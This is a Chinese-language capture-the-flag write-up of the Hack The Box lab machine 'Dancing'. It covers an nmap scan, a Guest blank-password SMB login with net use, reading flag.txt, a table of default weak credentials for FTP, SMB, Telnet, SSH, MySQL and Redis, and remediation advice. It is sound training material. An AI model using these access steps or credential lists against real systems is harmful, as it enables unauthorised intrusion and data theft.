---
title: "HTB Starting Point - Dancing 渗透测试报告"
date: 2026-07-11T15:30:00+08:00
draft: false
categories: ["渗透测试"]
tags: ["HTB", "Starting Point", "Dancing", "SMB", "NTLM", "文件共享攻击"]
---

## HTB Starting Point - Dancing 渗透测试报告

### 一、靶机信息

| 项目 | 内容 |
|------|------|
| 平台 | Hack The Box (HTB) |
| 分类 | Starting Point / Tier 0 |
| 机器名 | Dancing |
| 目标 IP | 10.129.139.175 |
| 难度 | 入门级 |

---

### 二、渗透测试完整流程

#### 阶段 1：信息收集（端口扫描）

```bash
nmap -sV -T4 -Pn 10.129.139.175
```

**扫描结果：**

```
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds  (SMB)
```

**关键发现：** 目标开放 445 端口，运行 SMB 服务（microsoft-ds）。

**基础知识：** SMB（Server Message Block）是 Windows 文件共享协议。开放 445 意味着目标可能有共享文件夹。

---

#### 阶段 2：漏洞分析

SMB 的常见攻击面：

1. **匿名/空密码共享** — Guest 或空密码允许访问共享目录
2. **SMB 版本漏洞** — EternalBlue (MS17-010)、SMBGhost 等
3. **弱密码爆破** — hydra 对常见凭据进行尝试
4. **共享目录信息泄露** — ADMIN$、C$ 暴露系统文件

入门靶机大概率是第一种——配置为允许空密码访问。

---

#### 阶段 3：漏洞利用

使用 Windows 原生 `net use` 命令挂载 SMB 共享：

```bash
# 使用 Guest 空密码连接
net use \\10.129.139.175\WorkShares "" /user:"Guest"
```

**踩坑记录：** 直接空密码可能被系统 NTLM 策略阻止（错误 1937），需改用 `Guest` 用户或 admin 权限修改 `LmCompatibilityLevel` 注册表项。

---

#### 阶段 4：文件枚举与 Flag 获取

连接成功后，浏览共享目录：

```bash
# 列出共享根目录
dir \\10.129.139.175\WorkShares
# 发现两个用户目录：Amy.J、James.P

# 进入 James.P 目录
dir \\10.129.139.175\WorkShares\James.P

# 读取 flag
type \\10.129.139.175\WorkShares\James.P\flag.txt
```

---

### 三、攻击链总结

```
nmap 扫描 → 445/tcp SMB
    │
    ▼
SMB 空密码/匿名访问测试
    │
    ▼
net use \\IP\WorkShares "" /user:"Guest"
    │
    ▼
dir 枚举目录 → James.P\flag.txt
    │
    ▼
type 读取 flag
```

---

### 四、四台机器回顾

| # | 机器 | 端口/服务 | 攻击方式 |
|---|------|-----------|----------|
| 1 | Meow | 23 Telnet | root 空密码 |
| 2 | Fawn | 21 FTP | anonymous 匿名登录 |
| 3 | Cap | 80 HTTP + 21 FTP | IDOR → pcap 分析 → 明文密码 |
| 4 | Dancing | 445 SMB | Guest 空密码访问共享 |

**技能树扩展：**

- Meow: Telnet 协议 + 弱配置
- Fawn: FTP 协议 + 匿名登录 + `get` 下载文件
- Cap: Web IDOR + pcap 分析 + 明文密码泄露 + SSH
- Dancing: SMB 协议 + NTLM 认证绕过 + `net use` 挂载

---

### 五、Windows vs Linux 命令对照

因为在 Windows 上无法使用 Linux 的 `smbclient`，本机全程使用 Windows 原生命令完成：

| 操作 | Linux | Windows |
|------|-------|---------|
| 端口扫描 | `nmap` | `nmap`（相同） |
| 连接 SMB 共享 | `smbclient //IP/共享名 -U user` | `net use \\IP\共享名 密码 /user:用户名` |
| 列出文件 | `ls` | `dir \\IP\共享名` |
| 查看文件内容 | `cat file.txt` | `type \\IP\共享名\file.txt` |
| 读取 flag | `get flag.txt`（FTP） | `type flag.txt` |

**`net use` 命令逐段解释：**

```bash
net use \\10.129.139.175\WorkShares "" /user:"Guest"
│        │        │    └ 共享文件夹名      │   └ 用户名为 Guest
│        │        └ 目标 IP 地址           └ 空密码（两个双引号）
│        └ 网络路径（\\ 是 Windows 网络路径前缀）
└ Windows 挂载网络共享的命令
```

翻译成 Linux 等价命令：
```bash
smbclient //10.129.139.175/WorkShares -U "Guest" -N
```

本质相同：连接远程共享 → 浏览文件 → 读取内容。

---

### 六、攻击思维：为什么知道用 Guest + 空密码？

并不需要提前知道。这是打靶过程中形成的**攻击模式**。

回顾四台机器的共性：

| 机器 | 端口 | 服务 | 用的凭证 | 为什么？ |
|------|------|------|----------|----------|
| Meow | 23 | Telnet | `root` / 空密码 | 管理员偷懒没设密码 |
| Fawn | 21 | FTP | `anonymous` / 空密码 | FTP 公开共享的设计惯例 |
| Dancing | 445 | SMB | `Guest` / 空密码 | Windows 内置来宾账户未禁用 |
| Cap | 21/80 | FTP/Web | `nathan` / 弱密码 | PCAP 抓包泄露明文 |

**核心规律：** 每个常见服务都有"默认弱账户"——

| 服务 | 默认弱账户 | 原因 |
|------|-----------|------|
| FTP (21) | `anonymous` | 早期设计允许公开匿名共享文件 |
| SMB (445) | `Guest` / `Administrator` | Windows 内置账户，管理员忘了禁用 |
| Telnet (23) | `root` / `admin` | Unix/Linux 管理员偷懒不设密码 |
| SSH (22) | `root` 弱口令 | 同上，人懒是老漏洞的第一生产力 |
| MySQL (3306) | `root` 空密码 | 默认安装无密码 |
| Redis (6379) | 无需认证 | 默认配置无密码 |

**遇到没见过的服务怎么办？**

1. 搜：`<服务名> default credentials`
2. 搜：`<服务名> anonymous access`
3. 搜：`<服务名> penetration testing`

不是背下来的，是**搜出来的**。打完 10 台机器，这个思维模式就成肌肉记忆了。

---

### 七、修复建议

| 问题 | 建议 |
|------|------|
| SMB 空密码访问 | 禁用 Guest 账户，所有共享要求认证 |
| 共享权限过大 | 按需分配只读/读写权限，限制共享范围和IP白名单 |
| SMBv1 遗留 | 禁用 SMBv1，使用 SMBv3 + 签名 |
| NTLM 弱认证 | 启用 Kerberos，强制 NTLMv2 |
